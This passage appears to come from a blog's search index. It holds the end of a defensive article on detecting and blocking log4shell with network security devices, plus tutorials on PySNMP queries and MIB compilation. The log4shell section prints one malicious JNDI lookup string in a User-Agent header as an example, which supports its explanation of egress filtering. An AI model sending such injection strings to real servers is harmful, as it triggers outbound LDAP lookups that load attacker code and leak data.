routers), or use one of the cloud vendors native network components.</p> <p>Security devices that are in the path (e.g. firewalls, load balancers), or are receiving a copy of the transmitted data (e.g. using a monitor session to mirror the traffic to an intrusion detection platform) allow you to detect and possibly block multiple stages of the log4shell attack. A few examples of how you may detect and limit your impact to log4shell, from a network security perspective, include:</p> <ul> <li>Regularly (and automatically) updating security signatures on firewalls, load balancers, and intrusion detection appliances.</li> <li>Decrypting SSL/TLS traffic so that signatures are more effective.</li> <li>Implementing a security policy that restricts the communication to and from your critical assets like web servers.</li> <li>Having a robust network logging infrastructure.</li> </ul>","tags":["Security"]},{"location":"2021/12/29/the-role-of-network-security-to-fight-log4shell/#security-device-signatures-for-detection","title":"Security Device Signatures for Detection","text":"<p>Network security vendors use signatures to detect and potentially drop traffic that is likely to be considered malicious. Within several hours of log4shell being announced, many vendors were already releasing signature updates that their customers could use to detect log4shell. Many network security vendors signatures are focused on the first stage of the attack; detecting JNDI strings within HTTP requests. In the case of this vulnerability the situation has been extremely dynamic, and as you saw in the Log4shell Attack Stages section above, pattern matching for JNDI strings can be extremely complex. Over the days that followed the announcement of log4shell, vendors regularly updated and released new signatures for their products as the situation evolved (even several weeks after the announcement, signatures are still being released).</p> <p>It is critical to ensure that these signatures are updated regularly and almost all network security platforms have a mechanism to automatically update their signatures on a scheduled basis. Monitoring that your network security platforms are on the latest signature version is critical. Additionally, each vendor may make an assumption on the action that its customers would want to take for a particular vulnerability, and as a result define a default action (e.g. drop, reset, alarm, allow) that a network security device takes when detecting a threat. Administrators should review these default actions to make sure that they align with their organizations assessment of the risk/exposure of the vulnerability and how it affects the business.</p> <p>If you're hosting your applications in AWS, consider looking into AWS Network Firewall and Suricata rules. While creating Suricata rules can be quite complex, Proofpoint offers an free/open rulset (and paid/PRO ruleset) called Emerging Threats which are updated very regularly, and in the context of log4shell had signatures available quite quickly.</p>","tags":["Security"]},{"location":"2021/12/29/the-role-of-network-security-to-fight-log4shell/#tls-decryption","title":"TLS Decryption","text":"<p>Threat signatures are only as good as they data that is compared against them. With the ever growing use of TLS to encrypt and protect legitimate users data, malicious data is also encrypted. This provides a protection to an attacker, allowing them to avoid the eyes of the security platforms that we deploy in our environments. TLS decryption on firewalls and load balancers allows these network security devices to see the data that is traversing between clients and servers in clear text, before re-encrypting the data and sending it along its way.</p> <p>Decryption makes threat signatures far more effective, but there are trade-offs. Depending on how much traffic is flowing through your network security device, it may not have the resources to decrypt all traffic without causing potential performance issues. By reviewing your network devices capabilities and assessing which traffic flows are the most critical to protect, you can determine what traffic should be decrypted while also limiting any performance issues.</p>","tags":["Security"]},{"location":"2021/12/29/the-role-of-network-security-to-fight-log4shell/#additional-prevention-measures","title":"Additional Prevention Measures","text":"<p>If you're unable to utilize your network security devices to detect malicious JNDI strings, or the network security vendors threat signatures miss a variant of the string, it is important that your firewalls security policies restrict access from your web servers outbound to the internet over LDAP, DNS and other related JNDI protocols. As previously mentioned, the initial JNDI string in an HTTP request isn't malicious on its own. The attack relies on an affected web server communicating outbound with an attacker controlled LDAP server on the internet.</p> <p>As a best practice, most firewall security policies should be created around a whitelist model that are very specific in permitting what protected resources can communicate with. Using a firewall platform that permits the creation of rules around applications instead of services or ports will help ensure that sessions through the firewall are exactly what they say they are. Take for example the following malicious JNDI string:</p> <pre><code>\"User-Agent: ${jndi:ldap://127.0.0.1:443/a}\"\n</code></pre> <p>If your firewall security policies are created around allowing TCP port 443 out to the internet for users browsing web pages, instead of an application of HTTPS. An affected web server that receives this malicious JNDI string will attempt to communication over TCP port 443 using LDAP and the firewall will permit the traffic. Instead of creating a security policy permitting TCP port 443 for web browsing, creating a security policy that allows an application of HTTPS and and TCP port of 443 would ensure that LDAP traffic over TCP port 443 is dropped.</p> <p>In the case of a JNDI string that uses DNS as a service, there are two considerations to make:</p> <ul> <li>Do you prevent your web servers from utilizating any DNS server other than your corporate owned/managed DNS servers?</li> <li>Do you utilize any DNS monitoring features on your firewalls, such as Domain Generation Algorithm (DGA) and DNS tunneling detection?</li> </ul> <p>If you allow users and servers in your environment to directly reference internet DNS servers out of your control (e.g. Google DNS) you lose an aspect of visibility and logging that you would otherwise get by enforcing all assets utilize a DNS server that you manage and control. This by itself doesn't prevent exfiltration of data with log4shell and a JNDI string using DNS. A vulnerable web server that receives such a JNDI string will send a DNS query to its local resolver, which you already most likely permit the web server to query. That local resolve will then most likely reference an upstream DNS server or the root DNS servers (also permitted through your firewall, or no one would be able to resolve internet FQDN's), to find an answer to the malicious domain name in the JNDI string. Eventually, through a series of iterative DNS queries the DNS server controlled by the attacker will receive the DNS query that the affected host sent, allowing it to log the data that was exfiltrated.</p> <p>To block these types of DNS queries, either your firewalls or your DNS server/platform need to implement additional mechanisms of identifying malicious domain names that are either known or recently generated (DGA), or that are exhibiting DNS tunneling.</p>","tags":["Security"]},{"location":"2021/12/29/the-role-of-network-security-to-fight-log4shell/#stepping-up-our-game-as-network-security-engineers","title":"Stepping Up Our Game As Network Security Engineers","text":"<p>As network security engineers it is important to fully understand the security platforms we support, and that the applications we protect are understood by us as more than just a source/destination IP and port. Our firewalls, load balancers, and intrusion detection devices are operating at all layers of the stack with full application layer visibility and implementing features at those layers. Building good relations with the application owners whose assets we are helping protect will help ensure that we can do so effectively.</p> <p>My experience with reviewing log4shell was greatly aided by the fact that I have taken a full-stack developer course. Although I didn't learn Java based backends (I was focused on Flask and Django for a backend and HTML/CSS/JS/React at the frontend), it certainly helps me better understand the ecosystem surrounding web-based applications and API's which are the primary tech stacks that I'm helping protect. While it may not be possible for everyone to go out and take a full-stack course on top of their day job, but learn from your app team every time that you interact with them so that you gain a higher level of understanding. It may also help you next time they \"blame the network\" for an issue!</p>","tags":["Security"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/","title":"SNMP Queries with PySNMP High-Level API","text":"<p>I've previously written about PySNMP's simpler SNMP query using one-liner command generator as a method to send SNMP queries using an OID. That method allows you to avoid having to compile MIB's that do not come as a default in the PySNMP library. In the next few posts I want to outline how to use PySNMP's high-level API (hlapi) and how to complie any MIB's that may be missing. This will help you use PySNMP in its intended fashion, and using the name of the OID which provides for better readability.</p> <p>Within this article I will explore PySNMP's hlapi by breaking down it's own quick start 'fetch SNMP variable example. The hlapi was designed to be an easy to use API for as close to a 'one-liner' SNMP query as you can get. The examples in this guide will focus on the synchronous implementation (performing one SNMP task at a time), but there is the capability to implement PySNMP asynchronously if you are looking for increased speed and scalability.</p> <p>Note</p> <p>The historical pysnmp project, which has not been maintained due the the unfortunate passing of the maintainer, has since been forked and is being actively maintained (disclaimer, I have yet to test it yet). Most links in my SNMP posts to the PySNMP readthedocs should automatically redirect to the latest documentation, but the technical nature of my posts has not yet been updated. I hope to update these posts so that the community has a good resource to reference for the updated package.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#getting-started-a-simple-snmp-query","title":"Getting Started - A Simple SNMP Query","text":"<p>We will start with a simple SNMP query using the method described in PySNMP's Quick Start linked above. In this particular example I am sending an SNMP GET to a Cisco IOSv router for sysName.</p> <pre><code>from pysnmp.hlapi import SnmpEngine, CommunityData, UdpTransportTarget,\\\n                         ContextData, ObjectType, ObjectIdentity, getCmd\n\niterator = getCmd(\n    SnmpEngine(),\n    CommunityData('rostring', mpModel=1),\n    UdpTransportTarget(('192.168.11.201', 161)),\n    ContextData(),\n    ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysName', 0))\n)\n\nerrorIndication, errorStatus, errorIndex, varBinds = next(iterator)\n\nif errorIndication:\n    print(errorIndication)\nelif errorStatus:\n    print('{} at {}'.format(errorStatus.prettyPrint(),\n                        errorIndex and varBinds[int(errorIndex) - 1][0] or '?'))\n\nfor oid, val in varBinds:\n    print(f'{oid.prettyPrint()} = {val.prettyPrint()}')\n</code></pre> <p>When the above code is ran, the following is the output that we get:</p> <pre><code>&gt;&gt;&gt; for oid, val in varBinds:\n...     print('{} = {}'.format(oid.prettyPrint(), val.prettyPrint()))\n...\nSNMPv2-MIB::sysName.0 = Router1.lab.yaklin.ca\n</code></pre> <p>To summarize what happened from a high-level:</p> <ol> <li>All necessary modules were imported to build an SNMP query</li> <li>An iterator was created which associates the various components of the SNMP query</li> <li>The query is sent to the router by referring to the iterator with next() and the resulting response and any errors are stored across four variables</li> <li>Checks are performed to see if any errors were picked up</li> <li>The returned value for sysName is printed to screen</li> </ol> <p>The remaining sections of this article will explain each of these points in further detail.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#installing-pysnmp","title":"Installing PySNMP","text":"<p>PySNMP runs with Python 2.4 through 3.7 according to the documentation, but I have been able to use its hlapi with Python 3.9.4. This doesn't guarantee that it will be stable with anything higher than 3.7.</p> <p>To install PySNMP to work with Python 3.9.4, use:</p> <pre><code>python3 -m pip install pysnmp\n</code></pre> <p>It should be pointed out that the PySNMP packages latest release of 4.4.12 was last released on Sept 24, 2019 as seen on Github. The PySNMP site itself has a disclaimer right at the top that the documentation is an inofficial copy. Although it has not been updated in quite some time, it still appears to be effective for performing SNMP queries with Python.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#pysnmp-modules-for-a-simple-snmp-get","title":"PySNMP Modules for a Simple SNMP GET","text":"","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#importing-the-necessary-components","title":"Importing the necessary components","text":"<p>Once you have PySNMP installed its time to import the various modules. The quick start tutorial uses wildcard imports as follows:</p> <pre><code>from pysnmp.hlapi import *\n</code></pre> <p>The above method is discouraged in the PEP8 style guide for all the reasons mentioned in the link and as a result I import each module by name so as to avoid confusion. This makes it obvious when reviewing code as to where names are coming from:</p> <pre><code>from pysnmp.hlapi import SnmpEngine, CommunityData, UdpTransportTarget,\\\n                         ContextData, ObjectType, ObjectIdentity, getCmd\n</code></pre>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#snmpengine-and-contextdata","title":"SnmpEngine() and ContextData()","text":"<p>The SnmpEngine() class creates an SNMP engine object which helps to maintain state information associated with the SNMP query. ContextData() is described by PySNMP as Creates UDP/IPv6 configuration entry and initialize socket API if needed and also assists in forming SNMP PDU's.</p> <p>There are multiple parameters that can be passed to both SnmpEngine() and ContextData(), but they are not necessary for our purpuses and so won't be discussed further. Just know that you need to provide them to getCmd() without any parameters as shown in the example code above.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#communitydata","title":"CommunityData()","text":"<p>To provide SNMPv1 or v2 community strings to PySNMP we form an instance of PySNMP's CommunityData() class and pass it our community string and if we're using SNMP v1 or v2c:</p> <pre><code>CommunityData('rostring', mpModel=1)\n</code></pre> <p>In this case, 'rostring' is the community string and <code>mpModel=1</code> indicates SNMPv2c (<code>mpModel=0</code> would be for SNMPv1).</p> <p>Note</p> <p>Check out the UsmUserData() class to learn more about using SNMPv3</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#udptransporttarget","title":"UdpTransportTarget()","text":"<p>To define which host you want to query via SNMP you use UdpTransportTarget(). The first, and only required, parameter of this method is a tuple representing the hostname or IP address and the UDP port as an integer:</p> <pre><code>UdpTransportTarget(('192.168.11.201', 161)),\n</code></pre> <p>A few additional parameters can be provided as well, if you need to control timeout intervals and retries. If not provided, a timeout of 1 second and 5 retries are the default values, but to adjust them the UdpTransportTarget() can be set as follows</p> <pre><code>UdpTransportTarget(('192.168.11.201', 161), timeout=3, retries=10),\n</code></pre>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#objecttype-and-objectidentity","title":"ObjectType() and ObjectIdentity()","text":"<p>The combination of an ObjectType() encapsulating an ObjectIdentity() defines which SNMP MIB variable we are going to query on the remote device. In this example sysName is being queried and is represented as follows:</p> <pre><code>ObjectIdentity('SNMPv2-MIB', 'sysName', 0)\n</code></pre> <p>Starting with ObjectIdentity() we can see that our example takes three prameters:</p> <ul> <li>The MIB name, in this case SNMPv2-MIB</li> <li>The MIB variable, in this case sysName</li> <li>The instance of the MIB variable, which is 0 in our case for sysName</li> </ul> <p>The combination of the three of these parameters represents the entire MIB variable ID of SNMPv2-MIB::sysName.0, or its OID of 1.3.6.1.2.1.1.5.0.</p> <p>Note that when using the the method shown in our example, which makes for a more human-readable variable, is only possible if you the MIB object you are querying is part of a MIB pre-compiled into PySNMP's format using PySMI. PySNMP ships with several common MIB's compiled in the format you may need, but if you are needing to query a MIB object that isn't compiled you can specify it using the integers representing the OID either as a string or as a tuple of integers.</p> <pre><code>ObjectIdentity('1.3.6.1.2.1.1.5.0')\nObjectIdentity((1,3,6,1,2,1,1,5,0))\n</code></pre> <p>If you don't have a compiled MIB for the OID that you are querying, the output of the ObjectIdentity on the returned value will be the OID instead of a human-readable value. See the section below on compiled MIB's with PySNMP.</p> <p>ObjectType() encapsulates our ObjectIdentity() into a container which we can use with various SNMP commands. In this instance the only parameter that we provide to ObjectType is our ObjectIdentity():</p> <pre><code>ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysName', 0))\n</code></pre>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#initiating-a-query-with-getcmd","title":"Initiating a Query with getCmd()","text":"<p>To send an SNMP GET to a device we will be using getCmd(). This creates a Python generator which creates an iterable object much like a list.</p> <p>getCmd() requires a minimum of five paramters passed to it (each of these will be explained in further detail in the sections below):</p> <ul> <li>An SNMP engine using SnmpEngine()</li> <li>An SNMP community string using CommunityData(), or SNMP v3 credentials with UsmUserData()</li> <li>A transport target, in this example we use an IPv4 so UdpTransportTarget()</li> <li>A UDP context using ContextData()</li> <li>One or more SNMP ObjectType() classes representing MIB variables (in our case sysName)</li> <li>Any optional parameters lookupMib</li> </ul> <p>By combining all of these elements with getCmd() we assign the resulting iterable object to a variable which we call iterator in our case:</p> <pre><code>iterator = getCmd(\n    SnmpEngine(),\n    CommunityData('rostring', mpModel=1),\n    UdpTransportTarget(('192.168.11.201', 161)),\n    ContextData(),\n    ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysName', 0))\n)\n</code></pre> <p>The above Python statement doesn't actually initiate any network traffic. No SNMP query has been snet to our device yet. Instead, it simply creates an iterable object by using a Python generator and in our case actions are only taken once we iterate over this object.</p> <p>To iterate over each sequential element in this iterator object we call it using Python's built-in next() function on it (<code>next(iterator)</code>). In this example there will only be a single element in this iterable because we only have a single MIB object of sysName, so next() is only called a single time as follows:</p> <pre><code>errorIndication, errorStatus, errorIndex, varBinds = next(iterator)\n</code></pre> <p>By accessing the next available element in the iterator, the getCmd() iterator returns four values:</p> <ul> <li>errorIndication - A string that when present indicates an SNMP error, along with the provided text of the error</li> <li>errorStatus - A string that when present indicates an SNMP PDU error</li> <li>errorIndex - The index in varBinds that generated the error</li> <li>varBinds - A sequence of MIB variable values returned via SNMP. These are PySNMP ObjectType class instances</li> </ul> <p>Note</p> <p>PySNMP supports other SNMP commands, such as bulkCmd(), nextCmd(), and setCmd(), by using the same generator/iterable approach.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#querying-multiple-snmp-oids","title":"Querying Multiple SNMP OID's","text":"<p>As mentioned in the getCmd() section above, getCmd() is able to take a variable number of ObjectType's so as to facilitate querying multiple OID's. The below example queries for both sysName and sysDescr:</p> <pre><code>iterator = getCmd(\n    SnmpEngine(),\n    CommunityData('rostring', mpModel=1),\n    UdpTransportTarget(('192.168.11.201', 161)),\n    ContextData(),\n    ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysName', 0)),\n    ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0))\n)\n\nerrorIndication, errorStatus, errorIndex, varBinds = next(iterator)\n</code></pre> <p>If both MIB objects are available on the remote system, varBinds will have two elements (one for each OID). In this particular case we don't need to use next() twice, as both OID's are provided to the iterator at the same time. The values of each element can be seen as follows:</p> <pre><code>&gt;&gt;&gt; varBinds[0].prettyPrint()\n'SNMPv2-MIB::sysName.0 = Router1.lab.yaklin.ca'\n&gt;&gt;&gt; varBinds[1].prettyPrint()\n'SNMPv2-MIB::sysDescr.0 = Cisco IOS Software, IOSv Software (VIOS-ADVENTERPRISEK9-M), Version 15.9(3)M2, RELEASE SOFTWARE (fc1)\\r\\nTechnical Support: http://www.cisco.com/techsupport\\r\\nCopyright (c) 1986-2020 by Cisco Systems, Inc.\\r\\nCompiled Tue 28-Jul-20 07:09 by prod_rel_team'\n</code></pre> <p>If you need to send an SNMP GET for one particular MIB variable, make a decision on the value that is returned and based on that decision query the same device again, there is no need to create a whole new iterator. Instead you can use the iterator.send() function to query a new SNMP variable by supplying a list of new ObjectType() class instances. An example of this is as follows:</p> <pre><code>&gt;&gt;&gt; errorIndication, errorStatus, errorIndex, varBinds = iterator.send([ObjectType(ObjectIdentity('SNMPv2-MIB', 'sysDescr', 0))])\n&gt;&gt;&gt; varBinds[0].prettyPrint()\n'SNMPv2-MIB::sysDescr.0 = Cisco IOS Software, IOSv Software (VIOS-ADVENTERPRISEK9-M), Version 15.9(3)M2, RELEASE SOFTWARE (fc1)\\r\\nTechnical Support: http://www.cisco.com/techsupport\\r\\nCopyright (c) 1986-2020 by Cisco Systems, Inc.\\r\\nCompiled Tue 28-Jul-20 07:09 by prod_rel_team'\n</code></pre>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#error-checking-of-the-snmp-response","title":"Error Checking of the SNMP Response","text":"<p>Each command generator (getCmd, nextCmd, bulkCmd, setCmd) return an errorIndication, errorStatus, errorIndex, and varBinds variable. The error related variables are described as follows:</p> <ul> <li>errorIndication: A string error message that when present indicates an SNMP Engine error</li> <li>errorState: A string error message that when present indicates an SNMP PDU error</li> <li>errorIndex: An integer that when non-zero indicates the position (n - 1) in varBinds that encountered the error</li> </ul> <p>Common logic on assessing these variables after each command generator is run is as follows:</p> <pre><code>if errorIndication:\n    print(errorIndication)\nelif errorStatus:\n    print('{} at {}'.format(errorStatus.prettyPrint(),\n                        errorIndex and varBinds[int(errorIndex) - 1][0] or '?'))\n</code></pre> <p>The above code first checks if there was an SNMP Engine error with errorIndication and if so prints it to screen. This is followed by checking if there is an SNMP PDU error with errorStatus and if so prints out the error message to screen followed by the index in varBinds and the value at varBinds. Of course when using SNMP at scale you may not be printing these to screen but updating a database or log file with the error that was encountered, adjusting additional logic to influence how the script treats the error for subsequent queries or analysis, or any other actions your script may need to make.</p> <p>An example of what a timeout error might look like is by viewing the output of errorIndication when this is encountered:</p> <pre><code>&gt;&gt;&gt; errorIndication\nRequestTimedOut('No SNMP response received before timeout')\n</code></pre>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#parsing-the-returned-response-data","title":"Parsing the Returned Response Data","text":"<p>Assuming you have gotten this far without any errors its now time to parse the response data in varBinds. PySNMP's generator commands describe varBinds as A sequence of ObjectType class instances representing MIB variables returned in SNMP response. We also know that an ObjectType instance represents the ObjectIdentity (which MIB variable was queried) and the payload that was returned in the response. This is useful because it tells us first which MIB variable is being returned (in our case sysName) and then what the value is. In our case we only queried sysName so its a safe assumption to make that we got a response for sysName, but in the example showed earlier where we queried for both sysName and sysDescr, it would be useful to know which element in the varBinds list corresponds to which MIB variable.</p> <p>In our example of querying for sysName we can see that varBinds has the following structure:</p> <pre><code>&gt;&gt;&gt; len(varBinds)\n1\n&gt;&gt;&gt; type(varBinds[0])\n&lt;class 'pysnmp.smi.rfc1902.ObjectType'&gt;\n&gt;&gt;&gt; varBinds\n[ObjectType(ObjectIdentity(&lt;ObjectName value object, tagSet &lt;TagSet object, tags 0:0:6&gt;, payload [1.3.6.1.2.1.1.5.0]&gt;), &lt;DisplayString value object, tagSet &lt;TagSet object, tags 0:0:4&gt;, subtypeSpec &lt;ConstraintsIntersection object, consts &lt;ValueSizeConstraint object, consts 0, 65535&gt;, &lt;ValueSizeConstraint object, consts 0, 255&gt;, &lt;ValueSizeConstraint object, consts 0, 255&gt;&gt;, encoding iso-8859-1, payload [Router1.lab.yaklin.ca]&gt;)]\n</code></pre> <p>There is a handy helper function called .prettyPrint() associated with ObjectType that can transform the whole response to a nice string by concatenating the MIB variable name and the response value together:</p> <pre><code>&gt;&gt;&gt; varBinds[0].prettyPrint()\n'SNMPv2-MIB::sysName.0 = Router1.lab.yaklin.ca'\n</code></pre> <p>In most scripts we will only care about the returned value and this can be accessed by referring to the payload of the ObjectType:</p> <pre><code>&gt;&gt;&gt; varBinds[0][1].prettyPrint()\n'Router1.lab.yaklin.ca'\n</code></pre>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/11/snmp-queries-with-pysnmp-high-level-api/#a-note-on-compiled-mibs-and-pysnmp","title":"A Note on Compiled MIB's and PySNMP","text":"<p>PySNMP looks for MIB files in a few locations that have been compiled in a specific format that it understands. Out of the box PySNMP comes with a few standard MIB's pre-compiled and this helps with translating the MIB variable names when parsing the varBinds ObjectType() instances, as well as allowing us to reference these MIB variables by name when defining the ObjectType() we want to query.</p> <p>In cases where we are querying based on an OID because we don't have a MIB pre-compiled, varBinds response variables are a bit more difficult to interpret. Take as an example the following varBinds variable that I queried which has a name of entPhysicalSerialNum and an OID of 1.3.6.1.2.1.47.1.1.1.1.11 so that I can get the serial number of a router (in this case at entPhysicalIndex of 1):</p> <pre><code>iterator = getCmd(\n    SnmpEngine(),\n    CommunityData('rostring', mpModel=1),\n    UdpTransportTarget(('192.168.11.201', 161)),\n    ContextData(),\n    ObjectType(ObjectIdentity('1.3.6.1.2.1.47.1.1.1.1.11.1'))\n)\n\nerrorIndication, errorStatus, errorIndex, varBinds = next(iterator)\n</code></pre> <p>When looking at the response for varBinds you can see that the MIB variable name isn't fully translated by PySNMP:</p> <pre><code>&gt;&gt;&gt; varBinds[0].prettyPrint()\n'SNMPv2-SMI::mib-2.47.1.1.1.1.11.1 = 9ZEB8BXGIB6LD28LWUY1O'\n</code></pre> <p>In an upcoming post I plan on highlighting how to compile MIB's so that you're able to reference a human readable name like entPhysicalIndex instead of its OID, and PySNMP in return is able to translate the OID back to a human readable name for you.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/14/compiling-snmp-mibs-for-pysnmp/","title":"Compiling SNMP MIB's for PySNMP","text":"<p>The ability to refer to a SNMP MIB variable by name is an important aspect for increasing readability and understanding of your Python scripts. PySNMP comes with several common pre-compiled MIB's in a format that its capable of using, but if you need to query a MIB variable it doesn't ship with, you're left refering to the variable as an SNMP OID. Having to remember what a particular OID is for, or creating a mapping table between a MIB variable name and its OID (such as a Python dictionary), can become tedious. Additionally, parsing a PySNMP ObjectType class instance that isn't fully translated to the MIB variable name can make things more complicated.</p> <p>Note</p> <p>The historical pysnmp project, which has not been maintained due the the unfortunate passing of the maintainer, has since been forked and is being actively maintained (disclaimer, I have yet to test it yet). Most links in my SNMP posts to the PySNMP readthedocs should automatically redirect to the latest documentation, but the technical nature of my posts has not yet been updated. I hope to update these posts so that the community has a good resource to reference for the updated package.</p> <p>When you install PySNMP with PIP you also get PySMI with it. PySMI was created by the same creator as PySNMP, and it allows you to compile other SNMP MIB's for your projects. This article will cover how to compile additional MIB's for your Python SNMP projects so that you can extend their capabilities!</p> <p>Note</p> <p>Looking for an introduction to PySNMP? Check out my previous post to get familiar!</p> <p>It should be pointed out that the PySNMP packages latest release of 4.4.12 was last released on Sept 24, 2019 as seen on Github. The PySNMP site itself has a disclaimer right at the top that the documentation is an inofficial copy. Although it has not been updated in quite some time, it still appears to be effective for performing SNMP queries with Python.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/14/compiling-snmp-mibs-for-pysnmp/#pysnmp-and-mibs","title":"PySNMP and MIB's","text":"<p>PySNMP comes pre-compiled with a few common MIB's for your use out-of-the-box. You can see which MIB's are pre-compiled by checking out your Python installations site-packages folder under pysnmp/smi/mibs. That being said, PySNMP will look in the following locations for other complied MIB's:</p> <ul> <li>Your PySNMP's installation folder under pysnmp/smi/mibs</li> <li>In your home directory under .pysnmp/mibs</li> <li>In any local directory or remote HTTP location that you specify when adding a plain-text MIB to your command generator (e.g. getCmd())</li> </ul>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/14/compiling-snmp-mibs-for-pysnmp/#where-to-find-3rd-party-mib-files","title":"Where to Find 3rd Party MIB Files","text":"<p>Each platform vendor (e.g. Cisco, Arista, F5, etc) will often create SNMP MIB's that customers can use for querying platform-specific features/statistics. Often times you can download these MIB files from a vendors website or directly from their product that you have installed in your environment.</p> <p>Using Cisco as an example, they have an SNMP object navigator (Cisco CCO login required) that allows you to browse their extensive list of SNMP objects and MIB's.</p>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/14/compiling-snmp-mibs-for-pysnmp/#using-plain-text-mibs","title":"Using Plain-Text MIB's","text":"<p>To use a plain-text MIB with your command generator you can provide an ObjectIdentity and ObjectType class instance that looks like the following:</p> <pre><code>ObjectType(ObjectIdentity(\n    'IF-MIB', 'ifInOctets', 1\n    ).addAsn1MibSource(\n        'file://.',\n        'file:///usr/share/snmp',\n    )\n)\n</code></pre> <p>In this particular case we are creating a reference to the MIB variable ifInOctets in the IF-MIB SNMP MIB. By using .addAsn1MibSource() we can provide multiple local or remote file locations for MIB files. In this particular case I have placed IF-MIB.my in the same directory that I'm running my script from (<code>file://.</code>), and have an alternative path to search (<code>file:///usr/share/snmp</code>), showing that its possible to refer to multiple locations. Additional locations can be remote HTTP sites to download the MIB from.</p> <p>An example of using this ObjectType with a command generator is as follows:</p> <pre><code>from pysnmp.hlapi import SnmpEngine, CommunityData, UdpTransportTarget,\\\n                         ContextData, ObjectType, ObjectIdentity, getCmd\n\niterator = getCmd(\n    SnmpEngine(),\n    CommunityData('rostring', mpModel=1),\n    UdpTransportTarget(('192.168.11.201', 161)),\n    ContextData(),\n    ObjectType(ObjectIdentity(\n        'IF-MIB', 'ifInOctets', 1\n        ).addAsn1MibSource(\n            'file://.'\n        )\n    )\n)\n\nerrorIndication, errorStatus, errorIndex, varBinds = next(iterator)\n</code></pre> <p>You can see that our varBinds variable returns the number of Octets received on the interface with SNMP IF Index 1. The best part of this is that the MIB variable name is fully referenceable, instead of showing the OID:</p> <pre><code>&gt;&gt;&gt; varBinds[0].prettyPrint()\n'IF-MIB::ifInOctets.1 = 81424'\n</code></pre>","tags":["Python","Automation","SNMP"]},{"location":"2022/01/14/compiling-snmp-mibs-for-pysnmp/#compiling-a-mib-into-pysnmp-format","title":"Compiling a MIB into PySNMP format","text":"<p>Referencing a plain-text MIB file works perfect fine for simple operations. However, I can see doing this at scale not being effective for the reason that the plain-text file needs to be read frequently, and if you're referring to a remote file location via HTTP this can add increased latency.</p> <p>PySMI (which comes installed as a dependency when you install PySNMP) gives you the ability to take a plain-text file and compile it directly into a format that PySNMP can use. By using the <code>mibdump.py</code> utility that is made available to you with PySMI, you can provide a few flags and it will generate a PySNMP MIB Python file. In this case we will use the IF-MIB as an example of compiling. Using Cisco's SNMP Object Navigator search for and download the IF-MIB and open it in a text editor.</p> <p>At the top of the IF-MIB.my file you'll see that there are a series of IMPORTS statements:</p> <pre><code>...\n\nIMPORTS\n    MODULE-IDENTITY, OBJECT-TYPE, Counter32, Gauge32, Counter64,\n    Integer32, TimeTicks, mib-2,\n    NOTIFICATION-TYPE                        FROM SNMPv2-SMI\n    TEXTUAL-CONVENTION, DisplayString,\n    PhysAddress, TruthValue, RowStatus,\n    TimeStamp, AutonomousType, TestAndIncr   FROM SNMPv2-TC\n    MODULE-COMPLIANCE, OBJECT-GROUP,\n    NOTIFICATION-GROUP                       FROM SNMPv2-CONF\n    snmpTraps                                FROM SNMPv2-MIB\n    IANAifType                               FROM IANAifType-MIB;\n\n...\n</code></pre> <p>These import statements refer to other MIB files that the IF-MIB relies on for declaring how to interpret the MIB file. In this particular case you will need to download all of the MIB files referenced after the <code>FROM</code> statements; SNMPv2-SMI, SNMPv2-TC, SNMPv2-CONF, SNMPv2-MIB, and IANAifType-MIB. Thankfully, these can be found at the same link I posted above.</p> <p>The reason these files are important is because PySMI will need to refer to these when compiling IF-MIB, so that it can build a complete PySNMP referencable MIB file.</p> <p>Once all of these files are downloaded and placed in a single folder, it's time to run <code>mibdump.py</code>:</p> <pre><code>(venv) snmp-testing % mibdump.py --generate-mib-texts --destination-format pysnmp IF-MIB\nSource MIB repositories: file:///usr/share/snmp/mibs, http://mibs.snmplabs.com/asn1/@mib@\nBorrow missing/failed MIBs from: http://mibs.snmplabs.com/pysnmp/fulltexts/@mib@\nExisting/compiled MIB locations: pysnmp.smi.mibs, pysnmp_mibs\nCompiled MIBs destination directory: /Users/byaklin/.pysnmp/mibs\nMIBs excluded from code generation: INET-ADDRESS-MIB, PYSNMP-USM-MIB, RFC-1212, RFC-1215, RFC1065-SMI, RFC1155-SMI, RFC1158-MIB, RFC1213-MIB, SNMP-FRAMEWORK-MIB, SNMP-TARGET-MIB, SNMPv2-CONF, SNMPv2-SMI, SNMPv2-TC, SNMPv2-TM, TRANSPORT-ADDRESS-MIB\nMIBs to compile: IF-MIB\nDestination format: pysnmp\nParser grammar cache directory: not used\nAlso compile all relevant MIBs: yes\nRebuild MIBs regardless of age: no\nDry run mode: no\nCreate/update MIBs: yes\nByte-compile Python modules: yes (optimization level no)\nIgnore compilation errors: no\nGenerate OID-&gt;MIB index: no\nGenerate texts in MIBs: yes\nKeep original texts layout: no\nTry various file names while searching for MIB module: yes\nCreated/updated MIBs:\nPre-compiled MIBs borrowed:\nUp to date 